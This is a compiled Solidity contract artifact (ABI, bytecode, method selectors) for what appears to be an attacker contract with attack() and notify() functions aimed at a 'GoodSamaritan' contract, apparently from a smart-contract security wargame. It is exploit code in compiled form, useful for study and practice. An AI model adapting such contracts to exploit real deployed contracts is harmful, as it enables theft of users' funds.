{"abi":[{"type":"constructor","inputs":[{"name":"goodSamaritanAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"goodSamaritan","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IGoodSamaritan"}],"stateMutability":"view"},{"type":"function","name":"notify","inputs":[{"name":"_amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610244380380610244833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6101be806100865f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c80636e9c9da51461004357806398d078b41461008b5780639e5faafc146100a0575b5f5ffd5b5f546100629073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b61009e610099366004610171565b6100a8565b005b61009e61010d565b5f8054604080516304a286c760e31b8152905173ffffffffffffffffffffffffffffffffffffffff9092169263251436389260048084019382900301818387803b1580156100f4575f5ffd5b505af1158015610106573d5f5f3e3d5ffd5b5050505050565b5f8054604080516304a286c760e31b8152905173ffffffffffffffffffffffffffffffffffffffff9092169263251436389260048084019382900301818387803b158015610159575f5ffd5b505af115801561016b573d5f5f3e3d5ffd5b50505050565b5f60208284031215610181575f5ffd5b503591905056fea2646970667358221220af3ac5131fdc4a915b123950d5eaef53b4852e79ab8788e5738b352317844d5164736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","goodSamaritan()":"6e9c9da5","notify(uint256)":"98d078b4"},"id":0}